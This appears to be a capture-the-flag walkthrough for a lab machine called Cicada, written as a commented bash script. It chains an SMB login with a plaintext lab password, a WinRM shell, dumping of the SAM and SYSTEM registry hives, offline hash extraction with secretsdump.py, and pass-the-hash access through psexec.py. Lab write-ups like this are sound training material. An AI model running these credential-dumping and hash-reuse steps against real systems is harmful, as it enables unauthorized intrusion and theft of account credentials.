# Cicada — HTB-style Walkthrough
# Video: https://youtu.be/qER4mbvXucE

```bash
#############################################
# 0. Files & assets
#############################################
# Provided / discovered:
# - DEV SMB share accessible
# - Host has WinRM enabled for one account
# - Ability to save HKLM hives to desktop for offline dumping
# - Tools used: smbclient, evil-winrm, reg, secretsdump.py, psexec.py

#############################################
# 1. SMB: access DEV share
#############################################
# replace $IP and $user2
smbclient //$IP/DEV -U $user2%'aRt$Lp#7t*VQ!3'

#############################################
# 2. WinRM: interactive shell
#############################################
# replace $IP, $domain, $user3, $pass3
evil-winrm -i $IP -u $user3 -p $pass3

#############################################
# 3. Dump registry hives (on target)
#############################################
# run from an elevated shell on the target
reg save HKLM\SYSTEM C:\Users\[USER]\Desktop\system.hive
reg save HKLM\SAM    C:\Users\[USER]\Desktop\sam.hive

# transfer the hive files to attacker machine (example using smb or scp)

#############################################
# 4. Offline SAM/registry extraction and lateral use
#############################################
# on attacker, after downloading sam.hive and system.hive
secretsdump.py -sam sam.hive -system system.hive LOCAL

# use extracted NT hashes for lateral movement
# replace <LM:NT> and $IP
psexec.py -hashes <LM:NT> administrator@$IP

```
